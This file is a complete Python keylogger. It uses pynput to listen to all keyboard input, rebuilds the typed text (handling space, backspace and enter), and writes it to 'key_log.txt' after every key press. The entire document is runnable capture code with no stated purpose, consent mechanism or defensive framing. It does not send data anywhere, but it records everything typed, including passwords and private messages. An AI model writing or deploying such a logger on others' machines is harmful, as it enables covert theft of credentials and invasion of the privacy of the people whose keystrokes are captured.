from pynput import keyboard

log_file = "key_log.txt"
typed_text = ""  # Store typed text in memory before saving

def on_press(key):
    global typed_text
    try:
        # Normal character keys
        typed_text += key.char
    except AttributeError:
        # Special keys handling
        if key == keyboard.Key.space:
            typed_text += " "
        elif key == keyboard.Key.backspace:
            typed_text = typed_text[:-1]
        elif key == keyboard.Key.enter:
            typed_text += "\n"
        # Ignore modifier keys (Shift, Ctrl, Alt, etc.)

    # Save current text to file
    with open(log_file, "w") as f:
        f.write(typed_text)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
